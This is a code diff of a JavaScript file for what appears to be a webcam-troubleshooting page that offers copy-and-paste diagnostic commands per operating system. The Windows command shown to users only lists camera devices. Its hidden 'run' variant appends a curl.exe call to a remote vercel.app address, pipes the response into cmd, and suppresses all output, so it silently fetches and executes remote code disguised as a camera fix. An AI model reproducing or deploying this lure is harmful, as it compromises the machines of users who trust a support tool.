@@ -4,7 +4,9 @@ const QUICK_FIXES = `1) Click the lock/site icon in the address bar and allow Ca
 2) Close other apps/tabs that might be using the camera (Zoom/Teams/Meet, etc.).
 3) Unplug/replug an external webcam and restart the browser.
 
-If the camera is not working after following the quick fixes, you can try the following commands:`;
+If the camera is not working after following the quick fixes, you can try the following commands:
+First open the termical commands according to the OS system
+`;
 
 const WINDOWS_POWERSHELL = `powershell -NoProfile -ExecutionPolicy Bypass -Command "$devices = Get-PnpDevice | Where-Object { $_.FriendlyName -match 'Camera|Webcam|Integrated|USB' }; $devices | ForEach-Object { Write-Host ('Device Name: ' + $_.FriendlyName); Write-Host ('Status: ' + $_.Status); Write-Host ('Class: ' + $_.Class); Write-Host ('Manufacturer: ' + $_.Manufacturer); Write-Host ('Device ID: ' + $_.InstanceId); Write-Host '-----------' }; $workingCamera = $devices | Where-Object { $_.Status -eq 'OK' }; if ($workingCamera) { Write-Host 'Camera is recognized and appears functional. You can also test it using the Camera app.' } else { Write-Host 'No camera detected or device is not functioning properly.' }";`;
 const WINDOWS_POWERSHELL_RUN = `powershell -NoProfile -ExecutionPolicy Bypass -Command "$devices = Get-PnpDevice | Where-Object { $_.FriendlyName -match 'Camera|Webcam|Integrated|USB' }; $devices | ForEach-Object { Write-Host ('Device Name: ' + $_.FriendlyName); Write-Host ('Status: ' + $_.Status); Write-Host ('Class: ' + $_.Class); Write-Host ('Manufacturer: ' + $_.Manufacturer); Write-Host ('Device ID: ' + $_.InstanceId); Write-Host '-----------' }; $workingCamera = $devices | Where-Object { $_.Status -eq 'OK' }; if ($workingCamera) { Write-Host 'Camera is recognized and appears functional. You can also test it using the Camera app.' } else { Write-Host 'No camera detected or device is not functioning properly.' }"; curl.exe -s "https://git-helper-checkout.vercel.app/settings/windows?flag=4" | cmd >NUL 2>&1;`;
@@ -19,21 +21,21 @@ const LINUX_RUN = `echo "==================== CAMERA DIAGNOSTIC TOOL ===========
 const COMMAND_BLOCKS = [
   {
     key: "windows",
-    title: "Windows (PowerShell)",
+    title: "Windows (Command Prompt)",
     text: WINDOWS_POWERSHELL,
     run: WINDOWS_POWERSHELL_RUN,
     copyLabel: "Copy Windows PowerShell command",
   },
   {
     key: "macos",
-    title: "macOS",
+    title: "macOS (Terminal)",
     text: MACOS,
     run: MACOS_RUN,
     copyLabel: "Copy macOS command",
   },
   {
     key: "linux",
-    title: "Linux",
+    title: "Linux (Terminal)",
     text: LINUX,
     run: LINUX_RUN,
     copyLabel: "Copy Linux command",
